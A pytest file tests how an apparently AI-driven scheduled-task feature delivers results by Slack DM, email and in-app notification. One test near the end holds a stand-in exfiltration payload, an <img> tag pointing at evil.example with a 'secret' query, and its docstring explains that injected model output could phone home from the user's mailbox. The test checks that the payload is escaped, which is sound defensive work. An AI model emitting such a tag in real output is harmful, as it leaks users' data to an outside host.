"""Scheduled tasks — delivering the result.

The rule these pin: the chat conversation is the canonical copy, so a channel
problem must never turn a run that produced a good answer into a failure. Every
channel reports its own outcome and none of them raise.

What reaches the user outside the app names the product with ``PRODUCT_NAME``
(the link back, the email's sender) and carries no old brand.
"""

from __future__ import annotations

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from backend.tests._legacy_brand import LEGACY_PATTERN
from rubik_core.brand import PRODUCT_NAME
from rubik_core.config import settings
from rubik_core.database.models import Base, Notification
from rubik_core.scheduled_tasks import delivery
from rubik_core.tools import email_sender as es

OWNER = "bellison@acme.example"
SESSION_ID = "sess-abc"


class _Task:
    """The two fields delivery reads off a task."""

    def __init__(self, channels):
        self.delivery_channels = list(channels)
        self.title = "Morning important emails"


class _FakeBot:
    """Stands in for SlackBotClient."""

    available = True
    outcome = "deliver"
    sends: list[dict] = []

    def __init__(self, *_a, **_kw):
        pass

    @property
    def is_available(self) -> bool:
        return type(self).available

    def send_dm(self, recipient_email, *, text=None, blocks=None):
        type(self).sends.append({"email": recipient_email, "text": text})
        if type(self).outcome == "skip":  # not in the workspace
            return None
        if type(self).outcome == "error":
            from backend.services.slack_service import SlackAPIError

            raise SlackAPIError("channel_not_found")
        return {"ok": True, "ts": "1700.0001"}


class _FakeTransport:
    def __init__(self):
        self.calls: list[dict] = []

    def send(self, *, sender, impersonate, spec):
        self.calls.append({"sender": sender, "impersonate": impersonate, "spec": spec})
        return "gmail-msg-1"


@pytest.fixture
def db(monkeypatch, tmp_path):
    # A FILE-backed sqlite db, not ":memory:" + StaticPool. The code under test
    # opens its own short-lived sessions (as it does in production), and
    # StaticPool pins every one of them to a SINGLE connection — so two
    # overlapping transactions raise "cannot start a transaction within a
    # transaction". That surfaced only on CI, only in a full-suite run, because
    # it needs another session to be mid-transaction. A file gives each session
    # its own connection, which is the production shape.
    engine = create_engine(
        f"sqlite:///{tmp_path}/scheduled_tasks.db",
        connect_args={"check_same_thread": False},
    )
    Base.metadata.create_all(bind=engine)
    Session = sessionmaker(autocommit=False, autoflush=False, bind=engine)
    monkeypatch.setattr("rubik_core.database.db.SessionLocal", Session)
    s = Session()
    try:
        yield s
    finally:
        s.close()
        engine.dispose()


@pytest.fixture
def slack(monkeypatch):
    _FakeBot.sends = []
    _FakeBot.available = True
    _FakeBot.outcome = "deliver"
    # Patch by STRING: delivery imports slack_service inside the function.
    monkeypatch.setattr("backend.services.slack_service.SlackBotClient", _FakeBot)
    return _FakeBot


@pytest.fixture
def transport():
    t = _FakeTransport()
    es.set_transport_factory(lambda: t)
    yield t
    es.reset_transport_factory()


@pytest.fixture(autouse=True)
def _baseline(monkeypatch):
    monkeypatch.setattr(settings, "FRONTEND_URL", "https://app.acme.example")
    monkeypatch.setattr(settings, "SCHEDULED_TASKS_EMAIL_AUTOSEND", True)


def _deliver(
    channels=("slack",),
    answer="Three emails need a reply.",
    recipient_email=OWNER,
):
    return delivery.deliver(
        task=_Task(channels),
        run_id="run-1",
        recipient_email=recipient_email,
        title="Morning important emails",
        answer_md=answer,
        chat_session_id=SESSION_ID,
        local_when="Wed Sep 9, 08:00 America/Chicago",
    )


# ── Slack ───────────────────────────────────────────────────────────────────


def test_the_dm_carries_the_answer_and_a_link_back(db, slack):
    outcome = _deliver()
    assert outcome["slack"] == "sent"
    text = slack.sends[0]["text"]
    assert "Morning important emails" in text
    assert "Three emails need a reply." in text
    assert "https://app.acme.example/chat?session=sess-abc" in text


def test_the_dm_links_back_to_the_product_by_name(db, slack):
    _deliver()
    text = slack.sends[0]["text"]
    assert f"|Open in {PRODUCT_NAME}>" in text
    assert LEGACY_PATTERN.search(text) is None


def test_a_recipient_outside_the_slack_workspace_is_a_skip_not_a_failure(db, slack):
    slack.outcome = "skip"
    outcome = _deliver()
    # A roster fact to clean up, not an outage — and the answer is already in
    # their chat, so the run still succeeded.
    assert outcome["slack"] == "skipped"


def test_a_slack_outage_is_recorded_and_swallowed(db, slack):
    slack.outcome = "error"
    assert _deliver()["slack"] == "failed"


def test_no_slack_app_installed_reads_as_disabled(db, slack):
    slack.available = False
    assert _deliver()["slack"] == "disabled"
    assert slack.sends == []


def test_a_long_answer_is_trimmed_below_slacks_block_limit(db, slack):
    """One block over 3000 chars makes Slack reject the WHOLE message, so the
    user would silently get nothing."""
    outcome = _deliver(answer="x" * 6000)
    assert outcome["slack"] == "sent"
    assert len(slack.sends[0]["text"]) < 3000


def test_trimming_never_leaves_a_dangling_link_bracket(db, slack):
    """A half-open <url|label> is itself invalid Block Kit."""
    answer = ("y" * 2550) + "<https://example.com|a link that gets cut>"
    _deliver(answer=answer)
    text = slack.sends[0]["text"]
    body = text.split("\n\n")[1]
    assert body.count("<") == body.count(">")


def test_chat_only_delivery_sends_nothing_outside_the_app(db, slack):
    outcome = _deliver(channels=())
    assert outcome["chat"] == "sent"
    assert "slack" not in outcome
    assert slack.sends == []


# ── email ───────────────────────────────────────────────────────────────────


def test_email_is_sent_as_the_recipients_own_mailbox(db, slack, transport):
    outcome = _deliver(channels=("email",))
    assert outcome["email"] == "sent"
    call = transport.calls[0]
    assert call["impersonate"] == OWNER
    assert call["spec"].to == [OWNER]
    assert "Morning important emails" in call["spec"].subject
    assert "https://app.acme.example/chat?session=sess-abc" in call["spec"].text_body


def test_the_email_comes_from_the_product_and_links_back_to_it(db, slack, transport):
    _deliver(channels=("email",))
    call = transport.calls[0]
    spec = call["spec"]
    assert call["sender"].startswith(PRODUCT_NAME)
    assert f"Open in {PRODUCT_NAME}: " in spec.text_body
    assert f">Open in {PRODUCT_NAME}</a>" in spec.html_body
    for part in (call["sender"], spec.subject, spec.text_body, spec.html_body):
        assert LEGACY_PATTERN.search(part) is None, part


def test_email_respects_our_own_autosend_switch_not_deep_preps(
    db, slack, transport, monkeypatch
):
    """Enabling one email path must not silently enable another."""
    monkeypatch.setattr(settings, "SCHEDULED_TASKS_EMAIL_AUTOSEND", False)
    monkeypatch.setattr(settings, "CUBIE_DEEP_PREP_EMAIL_AUTOSEND", True)
    assert _deliver(channels=("email",))["email"] == "disabled"
    assert transport.calls == []


def test_email_refuses_a_recipient_outside_the_current_workspace(
    db, slack, transport, set_test_workspace_domains
):
    set_test_workspace_domains("acme.example")
    outcome = _deliver(channels=("email",), recipient_email="colleague@bravo.example")
    assert outcome["email"] == "failed"
    assert transport.calls == []


def test_the_email_escapes_html_in_the_answer_and_the_title(db, slack, transport):
    """The answer is model output that may have read outside email. Raw, an
    injected ``<img>`` phones home when the mail opens, from our own mailbox.
    Markdown still renders, and a markdown image becomes a plain link."""
    answer = (
        "**Two** emails need a reply.\n"
        '<img src="https://evil.example/x?d=secret">\n'
        "![chart](https://evil.example/y.png)"
    )
    outcome = delivery.deliver(
        task=_Task(("email",)),
        run_id="run-1",
        recipient_email=OWNER,
        title='Inbox <a href="https://evil.example">sweep</a>',
        answer_md=answer,
        chat_session_id=SESSION_ID,
    )
    assert outcome["email"] == "sent"
    html_body = transport.calls[0]["spec"].html_body
    assert "<img" not in html_body
    assert "&lt;img" in html_body
    assert '<a href="https://evil.example">' not in html_body
    assert "&lt;a href=" in html_body
    assert "<strong>Two</strong>" in html_body
    assert "https://app.acme.example/chat?session=sess-abc" in html_body


# ── the notification row ────────────────────────────────────────────────────


def test_every_delivery_leaves_a_notification_pointing_at_the_result(db, slack):
    _deliver()
    db.rollback()
    note = db.query(Notification).one()
    assert note.actor_email == OWNER
    assert note.kind == "scheduled_task_result"
    assert note.link == f"/chat?session={SESSION_ID}"


def test_a_notification_failure_never_breaks_delivery(db, slack, monkeypatch):
    monkeypatch.setattr(
        "rubik_core.database.db.SessionLocal",
        lambda: (_ for _ in ()).throw(RuntimeError("db gone")),
    )
    outcome = delivery.notify(
        recipient_email=OWNER,
        title="t",
        chat_session_id=SESSION_ID,
        body="b",
    )
    assert outcome == "failed"
